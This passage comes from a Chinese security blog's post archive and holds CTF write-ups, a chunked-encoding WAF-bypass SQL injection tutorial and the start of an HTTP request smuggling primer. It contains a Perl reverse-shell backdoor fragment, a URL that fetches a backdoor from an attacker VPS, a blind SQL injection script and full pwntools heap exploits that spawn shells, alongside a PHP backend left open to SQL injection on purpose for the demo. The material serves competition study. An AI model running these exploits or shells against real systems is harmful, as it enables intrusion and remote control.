\"&gt;&amp;SOCK\");open(STDOUT,\"&gt;&amp;SOCK\");open(STDERR,\"&gt;&amp;SOCK\");$ENV&#123;'HISTFILE'&#125; = '/dev/null';system(\"w;uname -a;id;pwd\");exec(&#123;\"/bin/sh\"&#125; ($fake_process_name, \"-i\"));# Wrapper around printsub cgiprint &#123; my $line = shift; $line .= \"&lt;p&gt;\\n\"; $global_page .= $line;&#125;# Wrapper around exitsub cgiexit &#123; cgiprintpage(); exit 0; # 0 to ensure we don't give a 500 response.&#125;# Form HTTP response using all the messages gathered by cgiprint so farsub cgiprintpage &#123; print \"Content-Length: \" . length($global_page) . \"\\r Connection: close\\r Content-Type: text\\/html\\r\\n\\r\\n\" . $global_page;&#125; 请求如下1http://183.129.189.62:12507/?url=http://your_vps/backdoor.txt&amp;filename=URI/aaa.pm 然后在自己的服务器放一个跳转文件123&lt;?php header(\"Location: aaa://aaa.com\");?&gt; 访问?filename=xxx&amp;url=http://your_vps/302.php ，成功反弹shell thinkphp?用现有的链打过去就行了 REargument这题查壳发现是UPX，工具直接脱壳，然后ida分析，通过搜索字符串Flag来定位到main函数前面简单加密，发现是flag.txt，这里通过分析发现是打开了flag.txt文件，然后进行了加密，再进行cmp的check，flag刚好是32个字符这里进一步发现，是把输入的字符串(只能是0-9和a-f)每2位转成一个16进制的数字再存起来这里将存起来的数每个加一，然后再cmp比较，密文我们可以ida直接提取出来，最后一个脚本直接出字符再拼接，flag就出了 12345678910111213141516171819202122232425a = \"fmcj2y~&#123;\"b = \"\"for i in range(8): b += chr(ord(a[i])-i)print b check = [0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0]check[0] = 0x50check[1] = 0xC6 check[2] = 0xF1check[3] = 0xE4 check[4] = 0xE3 check[5] = 0xE2 check[6] = 0x9Acheck[7] = 0xA1check[8] = 0xA7check[9] = 222check[10] = 218check[11] = 70check[12] = 171check[13] = 46check[14] = 255check[15] = 219for i in range(16): print str(hex(check[i]-1))#4fc5f0e3e2e199a0a6ddd945aa2dfeda icekeyicekey.exe是.net写的程序，用dnspy打开，从modle进去主逻辑，找到main函数开始分析这道题通过调试就可以知道程序的大概流程，分析可知程序通过md5进行计算然后我们可以知道一段值，作为我们的key，同时发现对我们的输入进行了加密，和这段字符(ACF8D62AAA0B630C4AF43AF327CE129D46F0FEB98D9040F713BE65502A5107A)cmp在退出时又进行了一次解密这样我们可以通过调试修改掉密文，直接解密得到我们的flag{5acb06231724c8c369bae711166dbe85} EzRE打开ida分析，查找字符串win定位主逻辑。这种类型的题目时迷宫题，虽然程序加了反调试的东西，但不影响做题，这里1就是墙壁，99是最后的通关出口，所以我们要走迷宫，先找出地图：这里把地图拼接成7*7的方阵(16进制），然后走迷宫即可，这里1234对应是上下左右走一下迷宫2441444222331333224424444把顺序输入程序，flag即可打印出来1flag&#123;#FFRFFF####ZZRZZZ##FF#FFFF&#125; MISCsomething in image直接用010 editor打开搜flag搜到flag EzMemory不用内存分析直接string出可还行2333 elf just elf?先爆破得到密码123456，解压enc.txt和flag，用hydan对flag进行elf隐写解密获得秘钥8*&amp;#b，再用秘钥对enc.txt中的密文进行AES解密，解密出来以后再xxencode解密，然后再栅栏解密就行，最后flag是flag{2d5552f9f9812d3aa0e8c45dc0fb3f7b} 创新方向大数据安全好像是这题？不记得名字了，原题杯https://ray-cp.github.io/archivers/CVE-2017-17562-GoAhead-rce对着打就行","comments":true,"permalink":"https://xi4or0uji.github.io/2019/11/10/2019湖湘杯wp/","categories":[{"name":"CTF","slug":"CTF","permalink":"https://xi4or0uji.github.io/categories/CTF/"}],"tags":[{"name":"CTF","slug":"CTF","permalink":"https://xi4or0uji.github.io/tags/CTF/"}]},{"title":"利用分块传输绕过WAF进行SQL注入","date":"2019-11-06T16:00:00.000Z","path":"2019/11/07/利用分块传输绕过WAF进行SQL注入/","text":"前言前段时间看到了这个东西，好像很厉害的亚子，来研究一波 原理客户端给服务器发送数据的时候，如果我们利用协议去制作payload，就可以绕过http协议的waf，实现SQL注入分块传输编码（Chunked transfer encoding）是HTTP中的一种数据传输机制，在HTTP/1.1中，服务器发送给客户端的数据可以分成多个部分，在HTTP/1.1前，数据的发送是由Content-Length去决定的，它规定了一个包的长度，服务器也是按照这个去进行处理的。但是，使用分块传输的时候，数据会被分解出一个个小块，这样服务器就不需要预先知道总数据的大概长度，接收到一个个块进行处理就行了。正常我们发送很小的数据是不需要用到分块技术的，而下载大文件，或者发送一些后台需要很复杂的逻辑才能处理的请求的时候，就需要实时生成消息长度，服务器一般会使用Chunked编码。在进行Chunked编码进行传输的时候，响应头会有Transfer-Encoding: Chunked，去表明是使用Chunked编码传输内容的。分块技术的具体过程就是，实体直接被分割成多个块，即是应用层的数据在TCP传输的过程中，不作任何解释，全部理解成二进制流，然后按照MSS的长度切分，然后一起压到TCP协议栈里面，剩下的对这些二进制数据的具体解释，则交由应用层解决 复现过程写一个简单的SQL查询的后台12345678910111213141516171819&lt;?phpheader('Access-Control-Allow-Origin:*');$mysql = new mysqli();$mysql-&gt;connect('localhost','db_user','db_pass','db_name');if (!$mysql)&#123; echo \"error\"; exit(mysqli_connect_error());&#125;$mysql-&gt;set_charset(\"utf8\");$num = $_POST['id'];$sql = \"select * from `student` where id='$num'\";$result = $mysql-&gt;query($sql);if (gettype($result) == 'object')&#123; $result = $result-&gt;fetch_all();&#125;$number = $result[0][0];$username = $result[0][1];echo \"用户名：\".$username.\"&lt;br&gt;\";echo $sql.\"&lt;br&gt;\"; 首先我们进行正常的请求的数据包是这样的而如果我们进行分块传输的话进行分块传输的时候，请求头要加上Transfer-Encoding: Chunked，然后POST的数据规则如下123452 #下面的数据的长度，可以在后面加个分号然后添加注释（2; hello world）id #请求的参数2 #下面的数据的长度=1 #请求的值，和前面的id连起来0 #表明分块请求结束，一个0和两个换行 最后就是大佬写出的插件，安装了一键分块Orzhttps://github.com/c0ny1/chunked-coding-converter","comments":true,"permalink":"https://xi4or0uji.github.io/2019/11/07/利用分块传输绕过WAF进行SQL注入/","categories":[{"name":"WEB","slug":"WEB","permalink":"https://xi4or0uji.github.io/categories/WEB/"}],"tags":[{"name":"SQL","slug":"SQL","permalink":"https://xi4or0uji.github.io/tags/SQL/"}]},{"title":"2019上海市大学生信息安全竞赛wp","date":"2019-10-31T16:00:00.000Z","path":"2019/11/01/2019上海市大学生信息安全竞赛wp/","text":"前言这次上海市大学生查了几名没进有点可惜，出题太慢了，放下wp吧 WEBDecade跟上次字节跳动的题差不多…….只是过滤的东西有点不同 babyt5一道安恒月赛原题…………连flag文件名都不改…….. easysqlfuzz发现过滤了union select、or、逗号等等，于是union all select绕过union select，hex(mid(from))代替for和逗号，又发现权限是root，可以用mysql代替information，join代替逗号，最后没有列名的注入，然后脚本盲注123456789101112131415161718192021222324252627282930313233343536373839404142434445464748495051525354555657585960616263646566676869707172737475767778798081828384858687888990919293# -*- coding:utf8 -*- import requestsimport reimport timeold_url = r'http://47.105.183.208:29898/article.php?id='for i in range(10): l1 = 0 r1 = 100 while(l1&lt;=r1): mid1 = (l1 + r1)/2 payload = \"'||(select length(mid((select GROUP_CONCAT(e.1) from (select * from (select 1)a join (select 2)b join (select 3)c union all select * from fl111aa44a99g)e)from 1)))=\"+str(mid1)+\"%23\" # payload = \"'||(select length(group_concat(table_name)) from mysql.innodb_table_stats where database_name=database())=\"+str(mid1)+\"%23\" print payload url = old_url+payload try: http = requests.get(url,timeout=5) except requests.exceptions.Timeout: for p in range(1, 10): print \"p\"+str(p) try: http = requests.get(url,timeout=5) time.sleep(5) except requests.exceptions.Timeout: pass if http.content: break time.sleep(1) content = http.content plain = re.findall(r\"&lt;h1&gt;(.*?)&lt;/h1&gt;\",content)[0] if(plain == \"You Can Try \"): break else: payload = \"'||(select length(mid((select GROUP_CONCAT(e.1) from (select * from (select 1)a join (select 2)b join (select 3)c union all select * from fl111aa44a99g)e)from 1)))&gt;\"+str(mid1)+\"%23\" # payload = \"'||(select length(group_concat(table_name)) from mysql.innodb_table_stats where database_name=database())&gt;\"+str(mid1)+\"%23\" print payload url = old_url+payload try: http = requests.get(url,timeout=5) except requests.exceptions.Timeout: for p in range(1, 10): print \"p\"+str(p) http = requests.get(url,timeout=5) time.sleep(5) time.sleep(1) content = http.content plain = re.findall(r\"&lt;h1&gt;(.*?)&lt;/h1&gt;\",content)[0] if plain == \"You Can Try \": l1 = mid1 + 1 else: r1 = mid1 - 1 if mid1==0: break print str(i)+\":\"+str(mid1) k = '' w = -4 for j in range(1,2*mid1+1): if (j-1) % 10 == 0: w = w + 5 new2_k = \"\" for q in range(16): if q &gt; 9: s = chr(96+q-9) else: s = str(q) new_k = new2_k + s payload = \"'||hex(mid((select group_concat(e.2) from (select * from (select 1)a join (select 2)b join (select 3)c union all select * from fl111aa44a99g)e)from \"+str(w)+\")) like '\"+new_k+\"%'%23\" # payload = \"'||hex(mid((select group_concat(table_name) from mysql.innodb_table_stats where database_name=database())from \"+str(w)+\")) like '\"+new_k+\"%'%23\" print payload url = old_url+payload try: http = requests.get(url,timeout=5) except requests.exceptions.Timeout: for p in range(1, 10): print \"p\"+str(p) try: http = requests.get(url,timeout=5) time.sleep(5) except requests.exceptions.Timeout: pass if http.content: break time.sleep(1) content = http.content plain = re.findall(r\"&lt;h1&gt;(.*?)&lt;/h1&gt;\",content)[0] if plain == \"You Can Try \": break k = k+s new2_k = new2_k + s print k# fl111aa44a99g#61727469636c652c666c3131316161343461393967 PWNboringheap这题只有0x20、0x30、0x40的堆块可以用，同时程序有个漏洞点：abs整数溢出利用0x80000000 % 0x30 = -0x20 ,可以实现改写size，从而overlap，从而可以泄露出libc地址，同时实现double free，构造2条double free的链子，一条写入size=0x40，另一条写入伪造的fake_chunk，申请出来，改写topchunk的地址为malloc_hook上方，再次malloc就可以改写成onegadget从而getshell123456789101112131415161718192021222324252627282930313233343536373839404142434445464748495051525354555657585960616263646566676869707172737475767778798081828384858687888990919293949596979899100101102103104105#coding=utf8from pwn import *from libformatstr import FormatStrcontext.log_level = 'debug'context(arch='amd64', os='linux')# context(arch='i386', os='linux')local = 0elf = ELF('./pwn1')if local: p = process('./pwn1') libc = elf.libcelse: p = remote(\"8sdafgh.gamectf.com\",10001) libc = ELF('./libc.so')# onegadget64 = [0x45216,0x4526a,0xf02a4,0xf1147]# onegadget32 = [0x3ac5c,0x3ac5e,0x3ac62,0x3ac69,0x5fbc5,0x5fbc6]sl = lambda s : p.sendline(s)sd = lambda s : p.send(s)rc = lambda n : p.recv(n)ru = lambda s : p.recvuntil(s)ti = lambda : p.interactive()def debug(addr,PIE=True): if PIE: text_base = int(os.popen(\"pmap &#123;&#125;| awk '&#123;&#123;print $1&#125;&#125;'\".format(p.pid)).readlines()[1], 16) gdb.attach(p,'b *&#123;&#125;'.format(hex(text_base+addr))) else: gdb.attach(p,\"b *&#123;&#125;\".format(hex(addr)) def bk(addr): gdb.attach(p,\"b *\"+str(hex(addr))) def malloc(choice,content): ru(\"5.Exit\") sl('1') ru(\"3.Large\") sl(str(choice)) ru(\"Input Content:\") sd(content)def free(index): ru(\"5.Exit\") sl('3') ru(\"Which one do you want to delete?\") sl(str(index))def edit(index,where,content): ru(\"5.Exit\") sl('2') ru(\"Which one do you want to update?\") sl(str(index)) ru(\"Where you want to update?\") sl(str(where)) ru(\"Input Content:\") sd(content)def show(index): ru(\"5.Exit\") sl('4') ru(\"Which one do you want to view?\") sl(str(index))malloc(2,'aaaaaaaa\\n')#0malloc(2,'bbbbbbbb\\n')#1#8malloc(2,'cccccccc\\n')#2#9malloc(2,'dddddddd\\n')#3#10malloc(3,'eeeeeeee\\n')#4malloc(3,'ffffffff\\n')#5malloc(3,'gggggggg\\n')#6malloc(3,'hhhhhhhh\\n')#7edit(1,0x80000000,'\\x00'*0x10 + p64(0) + p64(0x1b1) + '\\n')free(1)malloc(2,'ffffffff\\n')#8show(8)ru('ffffffff'libc_base = u64(rc(6).ljust(8,'\\x00'))-0x3c4c0a-0x100print \"libc_base----&gt;\" + hex(libc_base)system = libc_base + libc.sym[\"system\"]main_arena = libc_base + 0x3c4b28malloc_hook = libc_base + libc.sym[\"__malloc_hook\"]onegadget = libc_base +0xf1147malloc(2,'eeeeeeee\\n')#9malloc(2,'iiiiiiii\\n')#10malloc(3,'kkkkkkkk\\n')#12malloc(3,'llllllll\\n')#13malloc(3,'mmmmmmmm\\n')#14free(2)free(3)free(9)free(4)free(5)free(11)malloc(2,p64(0x51)+'\\n')#15malloc(2,'nnnnnnnn\\n')malloc(2,'oooooooo\\n')malloc(3,p64(main_arena+8)+'\\n')malloc(3,'pppppppp\\n')malloc(3,'qqqqqqqq\\n')malloc(3,'\\x00'*0x38+p64(malloc_hook-0x18))py = ''py += 'aaaaaaaa' + p64(onegadget)+'\\n'malloc(3,py)# debug(0)# debug(0)ru(\"5.Exit\")sl('1')ru(\"3.Large\")sl('3')p.interactive() login程序功能就这几个1234567---Menu---1.login2.register3.Delete4.Edit5.ExitChoice: 保护，没开PIE12345Arch: amd64-64-littleRELRO: Full RELROStack: Canary foundNX: NX enabledPIE: No PIE (0x400000) IDA分析可以发现，delete中有uaf123456else if ( password[v1] )&#123; free((void *)*password[v1]); free(password[v1]); puts(\"Delete success!\");&#125; 在login函数中存在打印函数123456read(0, &amp;s, len); if ( !strcmp(&amp;s, *password[v1]) ) &#123; sub_400A54(); ((void (__fastcall *)(_QWORD))password[v1][1])(*password[v1]);//如果密码正常就会将密码打印出来 &#125; 那么就可以利用login函数将libc爆出来利用UAF构造出如图的情况，只要edit 1就能修改0的password指针，再一位一位爆破出来，拿到真实地址后就UAF修改free_hook为system即可exp如下123456789101112131415161718192021222324252627282930313233343536373839404142434445464748495051525354555657585960616263646566676869707172from pwn import *context.log_level = 'debug'p = process('./login')elf = ELF('./login')libc = elf.libcsd = lambda s:p.send(s)sl = lambda s:p.sendline(s)rc = lambda s:p.recv(s)ru = lambda s:p.recvuntil(s)sda = lambda a,s:p.sendafter(a,s)sla = lambda a,s:p.sendlineafter(a,s)def login(idx,l,pwd,flag = 0): if flag: sl('1') else: sla(\"Choice:\\n\",'1') sla(\"id:\\n\",str(idx)) sla(\"length:\\n\",str(l)) sda(\"password:\\n\",pwd)def register(idx,l,pwd,flag = 0): sla(\"Choice:\\n\",'2') sla(\"id:\\n\",str(idx)) sla(\"length:\\n\",str(l)) if flag: sda(\"password:\\n\",pwd) else: sla(\"password:\\n\",pwd)def delete(idx): sla(\"Choice:\\n\",'3') sla(\"id:\\n\",str(idx))def edit(idx,pwd): sla(\"Choice:\\n\",'4') sla(\"id:\\n\",str(idx)) sda(\"pass:\\n\",pwd)addr = elf.got['free']register(0,0x88,'R4bb1t')delete(0)# gdb.attach(p)register(1,0x18,p64(addr+5),1)pwd = '\\x7f'# gdb.attach(p)login(0,1,pwd)for i in range(5): edit(1,p64(addr+(4-i))) for j in range(1,0x100): login(0,i+2,chr(j) + pwd,1) if \"success!\" in p.recvuntil('\\n'): pwd = chr(j) + pwd breakprint pwdpause()free_addr = u64(pwd.ljust(8,'\\x00'))libc_base = free_addr - libc.symbols['free']system = libc_base + libc.symbols['system']free_hook = libc_base + libc.symbols['__free_hook']log.warn(\"free_addr --&gt; %s\",hex(free_addr))log.warn(\"libc_base --&gt; %s\",hex(libc_base))edit(1,p64(free_hook))register(2,0x48,'/bin/sh\\x00')edit(0,p64(system))delete(2)p.interactive() slient_notechecksec12345Arch: amd64-64-littleRELRO: Partial RELROStack: Canary foundNX: NX enabledPIE: No PIE (0x400000) 可以看到RELOR强度只开到Partial，也就是说got 表可改再来看一下功能Add12345678910111213141516171819202122232425unsigned __int64 sub_400AEC()&#123; int v1; // [rsp+4h] [rbp-Ch] unsigned __int64 v2; // [rsp+8h] [rbp-8h] v2 = __readfsqword(0x28u); puts(\"Which kind of note do you want to add?\"); sub_400AAA(\"Which kind of note do you want to add?\"); v1 = 0; __isoc99_scanf(\"%d\", &amp;v1); if ( v1 == 1 ) &#123; ptr = calloc(0x28uLL, 1uLL); puts(\"Content:\"); sub_400999(ptr, 40LL); &#125; else if ( v1 == 2 ) &#123; qword_6020D8 = calloc(0x208uLL, 1uLL); puts(\"Content:\"); sub_400999(qword_6020D8, 520LL); &#125; puts(\"finish!\"); return __readfsqword(0x28u) ^ v2;&#125; 只能申请两种大小的堆0x28和0x208，而且用calloc，也就是申请后会清空内容，两种大小的块用两个全局变量存放，且都只能放一个delete123456789101112131415161718192021unsigned __int64 sub_400BCF()&#123; int v1; // [rsp+4h] [rbp-Ch] unsigned __int64 v2; // [rsp+8h] [rbp-8h] v2 = __readfsqword(0x28u); puts(\"Which kind of note do you want to delete?\"); sub_400AAA(\"Which kind of note do you want to delete?\"); v1 = 0; __isoc99_scanf(\"%d\", &amp;v1); if ( v1 == 1 &amp;&amp; ptr ) &#123; free(ptr); &#125; else if ( v1 == 2 &amp;&amp; qword_6020D8 ) &#123; free(qword_6020D8); &#125; puts(\"finish!\"); return __readfsqword(0x28u) ^ v2;&#125; 存在UAF思路：unlink然后修改got表得到地址，再将free@got修改为system ,free(‘/bin/sh\\x00’) get shell常规unlink，具体操作就不多解释了，exp如下 123456789101112131415161718192021222324252627282930313233343536373839404142434445464748495051525354555657585960616263646566676869#coding:utf-8from pwn import *context.log_level = 'debug'local = 1if local: p = process('./pwn') elf = ELF('./pwn') libc = elf.libcelse: p = remote(\"\") # elf = ELF('./')#内存地址随机化def debug(addr=0,PIE=True): if PIE: text_base = int(os.popen(\"pmap &#123;&#125;| awk '&#123;&#123;print $1&#125;&#125;'\".format(p.pid)).readlines()[1], 16) print \"breakpoint_addr --&gt; \" + hex(text_base + 0x202040) gdb.attach(p,'b *&#123;&#125;'.format(hex(text_base+addr))) else: gdb.attach(p,\"b *&#123;&#125;\".format(hex(addr))) sd = lambda s:p.send(s)sl = lambda s:p.sendline(s)rc = lambda s:p.recv(s)ru = lambda s:p.recvuntil(s)sda = lambda a,s:p.sendafter(a,s)sla = lambda a,s:p.sendlineafter(a,s)def add(size,message): sla(\"Exit\\n\",'1') sla(\"Large\\n\",str(size)) sda(\"Content:\\n\",message)def delete(size): sla(\"Exit\\n\",'2') sla(\"Large\\n\",str(size))def edit(size,message): sla(\"Exit\\n\",'3') sla(\"Large\\n\",str(size)) sda(\"Content:\\n\",message)chunk = 0x6020D8one = [0x45216,0x4526a,0xf02a4,0xf1147]add(2,'\\n')add(1,'\\n')add(1,'\\n')add(1,'\\n')delete(2)for i in range(0xb): add(1,'\\n')pay = p64(0) + p64(0x1d0)pay += p64(chunk-0x18) + p64(chunk-0x10)pay = pay.ljust(0x1d0,'a')pay += p64(0x1d0) + p64(0x90) + '\\n'edit(2,pay)delete(1)pay = p64(0)*2 + p64(elf.got['free']) + p64(elf.got['calloc']) + '\\n'edit(2,pay)edit(1,p64(elf.plt['puts']) + '\\n')delete(2)calloc_addr = u64(rc(6).ljust(8,'\\x00'))libc_base = calloc_addr - libc.symbols['calloc']system = libc_base + libc.symbols['system']log.warn(\"calloc_addr --&gt; %s\",hex(calloc_addr))edit(1,p64(system) + '\\n')edit(2,'/bin/sh\\x00' + '\\n')delete(2)# debug()p.interactive() REpuzzle这里分析逻辑，化简函数可以看到需要绕过5层的check，前面三个分别是，输入16个16进制的字符，每两个转成hex，然后将字符转成16进制数值，问题不大，xor可以通过动态调试得到xor的固定值第一个是0x7D，然后一个个调试出来得到：0x7C,0xAB,0x2D,0x91,0x2F,0x98,0xED,0xA9所以就是输入的明文异或这些数值加密，得到密文，密文进行了一个sort函数，这里需要爆破出一个排列组合，选择不同的运算方式得到特定值，8个数，10种运算结果，这里直接写个C语言脚本爆破跑一下123456789101112131415161718192021222324252627282930313233343536373839404142434445464748495051525354555657585960616263646566676869707172737475767778798081828384858687888990919293949596979899100101102103104105106107108109110111112113114115116117118119120121122123124125126127128#include &lt;bits/stdc++.h&gt;using namespace std;int a[10];typedef int ll;ll n1 = 0x39f;ll n2 = 0x68;ll n3 = 0x209;ll n4 = 0x269;ll n5 = 0x12a;ll n6 = 0x1a1; ll n7 = 0x8a;ll n8 = 0x2c8;void init()&#123; n1 = 0x39f; n2 = 0x68; n3 = 0x209; n4 = 0x269; n5 = 0x12a; n6 = 0x1a1; n7 = 0x8a; n8 = 0x2c8;&#125;bool gao()&#123; bool result=false; int *v1 = a; while ( 2 )&#123; switch ( *v1 )&#123; case 0: n5 &amp;= n1; n4 *= n5; goto LABEL_4; case 1: if ( !n4 ) goto LABEL_6; n5 /= n4; n6 += n2; goto LABEL_4; case 2: n3 ^= n2; n8 += n7; goto LABEL_4; case 3: n8 -= n3; n3 &amp;= n6; goto LABEL_4; case 4: n2 *= n7; n4 -= n1; goto LABEL_4; case 5: n7 ^= n4; n1 -= n8; goto LABEL_4; case 6: if ( !n8 ) goto LABEL_6; n2 |= n6 / n8; n6 /= n8; goto LABEL_4; case 7: n1 += n5; n2 |= n6; goto LABEL_4; case 8: n7 *= n4; n3 -= n8; goto LABEL_4; case 9: n5 += n2; n4 ^= n3; LABEL_4: if ( ++v1 != a + 8 ) continue; if (n1 == 0xE7)&#123; if (n2 == 0x3878) if (n3 == 0x3A71) int e=1; &#125; result = (n1 == 0xE7) + (n2 == 0x3878) + (n3 == 0x3A71) + (n4 == 0xFFFFCC30) + (n5 == 0x10) + (n6 == 0x68) + (n7 == 0xFFFFFC49) == 7; if ( n8 != 0xFFFFFF11 ) goto LABEL_6; break; default: LABEL_6: result = 0; break; &#125; return result; &#125;&#125;bool flag=false;int cnt=0;void dfs(int p)&#123; if (flag) return; if (p == 8)&#123; init(); if (gao())&#123; flag=true; &#125; return; &#125; for (int i=0;i&lt;10;i++) a[p]=i; dfs(p+1); &#125;&#125; int main()&#123; dfs(0); for (int i=0;i&lt;8;i++) cout &lt;&lt; a[i] &lt;&lt; '\\n';&#125;得到的序列是：[6, 1, 4, 9, 5, 0, 7, 2]所以现在就是知道密文，接着异或回去就可以得到明文输入了：num = [0x7C,0xAB,0x2D,0x91,0x2F,0x98,0xED,0xA9]sort = [6, 1, 4, 9, 5, 0, 7, 2]flag = ''for i in range(8):flag += hex(sort[i]^num[i])[2:]print flag#7aaa29982a98eaab 接着输入即可得到flag MISC签到题直接拖进去ida然后找字符串，‘Password’,定位到check函数后，F5就可以看到flag了 CRYPTORSA分析一波可以得到123p+q = 196075640660409986135975784767502028538644025058282395628670981900974958890619954451344723318649578431744942274184506178219307129498083095220609328355931687266846079805131400737270051437647584592782747418213354229728108610925547647805880482097163218511341484311783416306321402379596024705973981708966729752698p*q = 9538795663851271297602738029671089878718012242935213096566250130325046936720540247534143498025477544161347330379679111765871420732255741210434736423951962189227302658997497664520929375215715960063615792480965807127438948044298348300153102760490410578638259665656608784635088735809470916136628779400145983632930861883762707606629208260803446083579674497451514650309351925430391515629898218875049677870989016071086844819626778388370764400242376469343158294638240660190754978627356076115228410162956087266527271225439142347304100660800517276772407728290414074912243665126741030948775883739544952378188264714716087909797 解个方程1234567891011#coding = utf8import structfrom sympy import *n = 9538795663851271297602738029671089878718012242935213096566250130325046936720540247534143498025477544161347330379679111765871420732255741210434736423951962189227302658997497664520929375215715960063615792480965807127438948044298348300153102760490410578638259665656608784635088735809470916136628779400145983632930861883762707606629208260803446083579674497451514650309351925430391515629898218875049677870989016071086844819626778388370764400242376469343158294638240660190754978627356076115228410162956087266527271225439142347304100660800517276772407728290414074912243665126741030948775883739544952378188264714716087909797m = 196075640660409986135975784767502028538644025058282395628670981900974958890619954451344723318649578431744942274184506178219307129498083095220609328355931687266846079805131400737270051437647584592782747418213354229728108610925547647805880482097163218511341484311783416306321402379596024705973981708966729752698p = Symbol('p')q = Symbol('q')print(solve([(p+q-m),(p*q-n)],[p,q])) 得到123p=106559472238507992886893257595935131953388935896627959833031588247260020805443236827178002922192535072027637299082200170640652258414961919417154405674232765071939665000916796219859195238458399706193108146924408124158611736331559842114957778275757663860676776947490183450347232203866189542181859286964311023847q=89516168421901993249082527171566896585255089161654435795639393653714938085176717624166720396457043359717304975102306007578654871083121175803454922681698922194906414804214604517410856199189184886589639271288946105569496874593987805690922703821405554650664707364293232855974170175729835163792122422002418728851 最后脚本123456789101112131415import gmpy2from libnum import *n = 9538795663851271297602738029671089878718012242935213096566250130325046936720540247534143498025477544161347330379679111765871420732255741210434736423951962189227302658997497664520929375215715960063615792480965807127438948044298348300153102760490410578638259665656608784635088735809470916136628779400145983632930861883762707606629208260803446083579674497451514650309351925430391515629898218875049677870989016071086844819626778388370764400242376469343158294638240660190754978627356076115228410162956087266527271225439142347304100660800517276772407728290414074912243665126741030948775883739544952378188264714716087909797c = 7303495910407762399046490836902121070389476875516762048462433039234972742941586801378979220008051262826174054961747648114128456872349675769941760630519744351742977740846748646739901172672743584989842268056810152117350241337045055812845489372389014195433916347255846499434232234822333192328886207187844781726928951986353054876826105507064928478812402103648940709131760865763234071703554208057808885564381400571862422316195578258814602362582573148358552148686182480215663291366798585241933446701357953551496955627421526567152576426417189707335038601040167826900549139608192971559659991213411381604721734898065256138516p = 89516168421901993249082527171566896585255089161654435795639393653714938085176717624166720396457043359717304975102306007578654871083121175803454922681698922194906414804214604517410856199189184886589639271288946105569496874593987805690922703821405554650664707364293232855974170175729835163792122422002418728851q = 106559472238507992886893257595935131953388935896627959833031588247260020805443236827178002922192535072027637299082200170640652258414961919417154405674232765071939665000916796219859195238458399706193108146924408124158611736331559842114957778275757663860676776947490183450347232203866189542181859286964311023847phi = (p-1)*(q-1)e = 251d = gmpy2.invert(e, phi)print n2s(pow(c, d, n)) poly一波分析以后发现居然是个假的加密函数……加密前和加密后的东西没啥区别……那就直接去十六进制转字符串 poly_rev分析一波，其实就是多项式的解方程而已……12345678910111213141516171819202122232425262728293031323334353637383940414243444546474849505152535455565758import osP=PolynomialRing(GF(2),'x')F.&lt;x&gt; = GF(2)[]pol = x**255+ x**143+ x**47 + x**3 + 1 r1 = 0x8eeb27d8c2776920bd4672bbcee6d1ebf357c81419e2c3e2073a1e241dbdr2 = 0x8e4188999c007557e481d4dfcf51a8bb92a752ebac7015967f1133387c7cc1 = 0x237b20405cf83f261749fba5507ed14cb566e3722a93308c7752297d92a8338cc2 = 0x1f8fe9b5e32500c3d306924938d1f443b3718ec410c380944503311ff932f528m1 = 0x1a99ff13954d42e6a21af67aa58e2df8b7bec68f499edf992c95b25326ed768cm2 = 0x1e63622141285872093eda8da6c7a94ad7c50e695fdc6ed9bd8adaf4c6c40b14FF = GF(2**256)def get_poly(m): m = bin(m)[2:] f1, ii = 0, 0 for cc in m[::-1]: f1 += int(cc) * x**ii ii += 1 return f1def back(n): tmp = n.exponents() enc = '' for i in range(256): if i in tmp: enc += '1' else: enc += '0' enc = hex(int(enc[::-1],2)).lstrip('0x').rstrip('L').zfill(64) return encpr1 = get_poly(r1)pr2 = get_poly(r2)pc1 = get_poly(c1)pc2 = get_poly(c2)pm1 = get_poly(m1)pm2 = get_poly(m2)#print(pr1)#print(pr2)#print(pc1)#print(pc2)c = pc1-pc2r = pr1-pr2k1 = inverse_mod(pr1-pr2, pol)*(pc1-pc2)%pol#print(k1)k2 = inverse_mod(pr2-pr1, pol)*(pc1*pr2-pc2*pr1%pol)#print(k2)msg1 = inverse_mod(k1, pol)*(pm1-k2)%polmsg2 = inverse_mod(k1, pol)*(pm2-k2)%polflag1 = back(msg1)flag2 = back(msg2)print(flag1)print(flag2)","comments":true,"permalink":"https://xi4or0uji.github.io/2019/11/01/2019上海市大学生信息安全竞赛wp/","categories":[{"name":"CTF","slug":"CTF","permalink":"https://xi4or0uji.github.io/categories/CTF/"}],"tags":[{"name":"CTF","slug":"CTF","permalink":"https://xi4or0uji.github.io/tags/CTF/"}]},{"title":"HTTP请求走私","date":"2019-10-29T16:00:00.000Z","path":"2019/10/30/HTTP请求走私/","text":"前言当初嘶吼有一道题把菜鸡卡住了，师傅们在群上发了知识点，发现还是挺有趣的，来研究一波 HTTP/1.1协议简单介绍emmm，估计师傅们都对它十分熟悉了，就是一种无状态的、应用层的、以请求/应答方式运行的协议，使用可扩展的语义和自描述的信息格式，和网络上的超文本信息系统进行互动HTTP协议工作于客户端-服务端架构之上，浏览器作为HTTP客户端通过URL向HTTP服务端，也就是WEB服务器发送请求。WEB服务器根据接收到的请求，向客户端发送响应信息。服务器与客户端的HTTP通信过程，请求和响应都是一个数据包，他们之间进行通信的时候是需要一个传输的通道的，所以在通信前会先创建tcp连接，连接好以后才发送请求。 TCP三次握手三次握手估计师傅们也十分熟悉了，就是最开始的三次网络传输，客户端与服务端交替发送数据，建立了tcp连接，然后再进行http通信在HTTP1.0协议中，每一次请求的时候都需要创建tcp连接，发送完请求，服务器响应以后，tcp连接就关闭了。但是在HTTP1.1协议中，有个Keep-Alive方法，可以让连接一直保持，然后在第二次请求的时候，就可以直接连接过过，不用再次进行三次握手。同样的，HTTP1.1还多了一个Pipeline属性，顾名思义，就是让客户端可以像流水线一样发送自己的HTTP请求，不用再慢慢等服务器响应，服务器接到请求的时候，按照先进先出的原则将响应发给客户端 HTTP属性请求头1234567891011121314#浏览器支持的MINE类型Accept:#浏览器支持的压缩类型Accpet-Encoding:#浏览器支持的语言类型，按位置先后确定优先顺序Accpet-Language:#浏览器处理长连接的方式Connection: close/keep-alive#cookie，缓存的一些信息Cookie:#请求的服务器Host:#客户端的操作系统、浏览器等信息User-Agent: 响应头12345678910#服务端使用的web服务器Server: Apache/2.4.18(Ubuntu)#服务端设置的CookieSet-Cookie:#资源最后的修改时间Last-Modified:#重定向的页面，通常配合302一起使用Location:#body部分的长度Content-Lenght: 状态码1234567200 OK //服务端请求成功400 Bad Request //服务器请求语法有误，无法解析401 Unauthorized //请求未经授权，通常伴有跨域问题403 Forbidden //服务器拒绝提供服务，权限不允许404 Not Found 